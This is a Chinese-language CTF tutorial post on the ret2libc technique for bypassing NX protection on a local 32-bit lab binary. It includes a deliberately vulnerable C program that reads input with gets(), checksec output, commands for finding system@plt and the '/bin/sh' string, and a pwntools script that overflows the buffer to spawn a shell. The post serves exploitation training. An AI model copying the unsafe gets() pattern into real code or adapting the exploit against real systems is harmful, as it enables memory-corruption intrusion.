---
title: ret2libc攻击技术示例-模拟执行system函数绕过NX保护
tags: [CTF, pwn, rop]
layout: post
categories: tutorials
---

## 什么是ret2libc？

ret2libc即return to libc，返回到系统函数库执行的攻击方法。

当程序开启`NX`保护时，我们的shellcode无法在缓冲区中执行，但是又没有直接的可以使用的system("/bin/sh")代码片段。这时，我们就可以通过使用libc中的system函数，并模拟system函数的执行过程，将"/bin/sh"参数传入system函数并执行，从而获取shell

## ret2libc示例代码

``` c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

char *shell = "/bin/sh";
char buf2[100];

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("shell!?");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf1[100];

    printf("RET2LIBC >_<\n");
    gets(buf1);

    return 0;
}
```

本节示例的漏洞程序可以从此处下载： [ret2libc1](http://od7mpc53s.bkt.clouddn.com/ret2libc1)

使用peda自带的checksec功能检查程序开启的保护机制，这里程序只开启了`NX`保护
``` bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
## 漏洞分析

在调用函数比如这里我们想要执行`call system`这条指令，那么cpu在调用函数的过程中会完成哪些工作呢？

1. 首先程序会将system()函数的各个参数，从右至左依次压入栈中
2. 将`call system`这条指令的地址压入栈中。（当函数执行完毕，会执行`ret`指令将该地址弹出给EIP，这样就能在执行完`call system`后继续往下执行）
3. 将system()函数的地址赋给EIP，也就是跳转到system函数开始执行

那么对应的栈空间其实如下图所示

![callsystem-stack-layout](http://od7mpc53s.bkt.clouddn.com/ret2libc-system-stack-layout.png)

其中`padding1`是我们定位buf首地址和返回地址之间的偏移，我们用字符填充，随后的`padding2`其实是`system("/bin/sh")`执行完的返回地址，因为我们只需要得到shell，而不用管当shell停止后会如何运行，因此这里的4字节我们可以随意填充。当然如果你要写的漂亮些，也可以将其修改为`exit()`的地址

那么我们就开始收集信息，这里的`padding1`长度我们计算后依旧是112，关于`system()`和`/bin/sh`我们也可以通过如下命令得到

``` bash
➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'
Strings information
============================================================
0x08048720 : /bin/sh
➜  ret2libc1 objdump -dj .plt ret2libc1 | grep 'system'
08048460 <system@plt>:
```
值得注意的是，这里是`system@plt`，跟我们所知的system函数还是有所区别的，这相关于linux的延迟绑定，我们暂不作深究。

## 攻击代码

``` python
from pwn import *

bin_sh = 0x08048720
plt_system = 0x08048460

payload = 'A' * 112
payload += p32(plt_system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

io = process('ret2libc1')
io.sendline(payload)
io.interactive()
```
